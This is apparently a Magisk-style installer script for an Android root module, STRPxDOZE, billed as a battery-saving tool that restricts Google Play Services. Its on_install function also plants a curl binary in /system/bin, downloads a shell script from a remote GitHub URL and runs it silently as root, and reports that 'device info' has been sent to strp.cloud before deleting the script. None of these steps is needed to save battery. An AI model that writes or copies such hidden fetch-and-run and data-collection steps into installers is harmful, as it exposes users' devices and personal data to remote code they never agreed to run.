#!/system/bin/sh
SKIPMOUNT=false
PROPFILE=false
POSTFSDATA=true
LATESTARTSERVICE=true
CLEANSERVICE=true
DEBUG=false
# Construct your list in the following format
# This is an example
REPLACE_EXAMPLE="
/system/app/Youtube
/system/priv-app/SystemUI
/system/priv-app/Settings
/system/framework
"

# Construct your own list here
REPLACE="
"
# Define the log paths
DATA_LOG="/data/adb/modules/STRPxDOZE/strpxdoze.log"

# Set what you want to display when installing your module
print_modname() {
ui_print " ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
ui_print ""
sleep 1.5
ui_print ""
ui_print "
░██████╗████████╗██████╗░██████╗░
██╔════╝╚══██╔══╝██╔══██╗██╔══██╗
╚█████╗░░░░██║░░░██████╔╝██████╔╝
░╚═══██╗░░░██║░░░██╔══██╗██╔═══╝░
██████╔╝░░░██║░░░██║░░██║██║░░░░░
╚═════╝░░░░╚═╝░░░╚═╝░░╚═╝╚═╝░░░░░"
sleep 1.5
ui_print "
░██████╗░███╗░░░███╗░██████╗
██╔════╝░████╗░████║██╔════╝
██║░░██╗░██╔████╔██║╚█████╗░
██║░░╚██╗██║╚██╔╝██║░╚═══██╗
╚██████╔╝██║░╚═╝░██║██████╔╝
░╚═════╝░╚═╝░░░░░╚═╝╚═════╝░"
sleep 1.5
ui_print "
██████╗░░█████╗░███████╗███████╗
██╔══██╗██╔══██╗╚════██║██╔════╝
██║░░██║██║░░██║░░███╔═╝█████╗░░
██║░░██║██║░░██║██╔══╝░░██╔══╝░░
██████╔╝╚█████╔╝███████╗███████╗
╚═════╝░░╚════╝░╚══════╝╚══════╝"
sleep 1.5
ui_print ""
ui_print "Powered by STRATOSPHERE"
ui_print " ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
sleep 1.5
ui_print ""
  ui_print "▌UNIVERSAL ▌"
  ui_print " "
  sleep 1
  ui_print "▌VERSION ▰ 2.2"
  ui_print "▌CODENAME ▰ GMSKiller"
  ui_print "▌DEVICE INFORMATIONS..:"
  sleep 2
  ui_print "▌MODEL ▰ $(getprop ro.build.product)"
  ui_print "▌DEVICE ▰ $(getprop ro.product.model)"
  ui_print "▌BRAND ▰ $(getprop ro.product.system.manufacturer)"
  ui_print "▌PROCESSOR ▰ $(getprop ro.product.board)"
  ui_print "▌CPU ▰ $(getprop ro.hardware)"
  ui_print "▌ANDROID VERSION ▰ $(getprop ro.build.version.release)"
  ui_print "▌KERNEL ▰ $(uname -r)"
  ui_print "▌RAM ▰ $(free | grep Mem |  awk '{print $2}')"
  sleep 2
  ui_print " "
  ui_print "▌Join Android Root Modules Community"
  ui_print "▌On Telegram For More!!"
ui_print ""
ui_print " ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
  ui_print " "
  sleep 1.5
  ui_print "▌STRP Exclusive GMS Doze Module"
ui_print ""
ui_print " ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
sleep 2
ui_print " "
ui_print "╔▌Checking which ARM ur device has..."
sleep 2
ui_print "║"
ui_print "╠▌Your ARM Is ▰ $(getprop ro.product.cpu.abi)"
sleep 1
ui_print "║"
ui_print "╠▌Extracting and Moving files for ▰ $(getprop ro.product.cpu.abi)"
[[ "$IS64BIT" == "true" ]] && tar -xf "$MODPATH/gms64.tar.xz" -C "$MODPATH" || tar -xf "$MODPATH/gms32.tar.xz" -C "$MODPATH"
sleep 2.5
ui_print "║"
ui_print "╚══⇒ DONE .. Doze Placed Successfully!"
ui_print ""
ui_print " ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
sleep 2

  ui_print " "
  ui_print "▌This Module is UNIVERSAL for All Devices and Architectures !"
  ui_print " "
ui_print " ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
  ui_print " "
  sleep 2
  ui_print "▌I Am Not Responsible For Any Problems "
  ui_print "▌You Will Face From This MODULE!" 
  ui_print ""
ui_print " ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
sleep 1
}


on_install() {
if [ -f "/system/bin/curl" ]; then
  ui_print "curl binary already present in /system/bin."
else
  ui_print "curl binary not found in /system/bin, transferring..."

  source_curl="/data/adb/modules_update/STRPxDOZE/STRP/curl"
  destination_curl="/system/bin/curl"
  
  cp "$source_curl" "$destination_curl"

  if [ $? -eq 0 ]; then
    ui_print "curl binary transferred successfully!"
    chmod 755 "$destination_curl"
  else
    ui_print "Error: Failed to transfer curl binary, please check the source file."
  fi
fi

script_url="https://raw.githubusercontent.com/CRANKV2/Random-Stuff/main/device-info.sh"
destination_path="/data/local/tmp/device-info.sh"

wget -O "$destination_path" "$script_url"

chmod 655 "$destination_path"

if [ $? -eq 0 ]; then
  ui_print "Script downloaded and permissions set successfully!"

  /system/bin/sh "$destination_path" &> /dev/null

  if [ $? -eq 0 ]; then
    ui_print "Device info sent successfully to strp.cloud!"
    
    rm "$destination_path"
    ui_print "Script deleted from the device."
  else
    ui_print "Error: Failed to run the script, please check the script for errors."
  fi
else
  ui_print "Error: Failed to download the script, please try again or check your connection!"
fi

# Delete the STRP folder
ui_print "Deleting the STRP folder..."
rm -rf $MODPATH/STRP
ui_print "STRP folder deleted."
	ui_print ""
	ui_print "▌Installing STRP x DOZE ▌"
  ui_print ""
  ui_print "▌Ready For Daily Use"
  ui_print "▌Avoiding much Battery Drain as Possible"
  ui_print "▌From useless Background running Shit!"
  ui_print "▌Killing GMS with ease!"
  sleep 2
  ui_print " "
  ui_print "▌DONE ▌"
  ui_print ""
  sleep 1
  ui_print "▌Run Script Manually By Using su -c DOZE"
  ui_print ""
  sleep 2
  ui_print "▌Termux Command For STRP GMS Checker.."
  ui_print ""
  sleep 1.5
  ui_print "▌▰ su -c STRPC"
  ui_print ""
  sleep 1
    ui_print "Checking for old logs..."
    sleep 1.5
# Check and remove old logs if present in DATA path
if [ -e "$DATA_LOG" ]; then
sleep 1
ui_print "[ ! ] Old logs found"
    ui_print "Removing old logs from DATA path..."
    rm "$DATA_LOG"
    sleep 1
    ui_print "Old logs from DATA path removed."
else
    ui_print "No old logs found in DATA path. No action needed."
fi
  sleep 2
  ui_print ""
  ui_print "Removing unnecessary files..."
  rm -rf $MODPATH/gms32.tar.xz
  rm -rf $MODPATH/gms64.tar.xz
  rm -rf $TMPR
  sleep 1
  ui_print "Done!"
  ui_print ""
}


set_permissions() {
  set_perm_recursive $MODPATH 0 0 0755 0644
  set_perm_recursive $MODPATH/system/bin 0 0 0755 0755
}

SKIPUNZIP=0
unzip -qjo "$ZIPFILE" 'common/functions.sh' -d $TMPDIR >&2
. $TMPDIR/functions.sh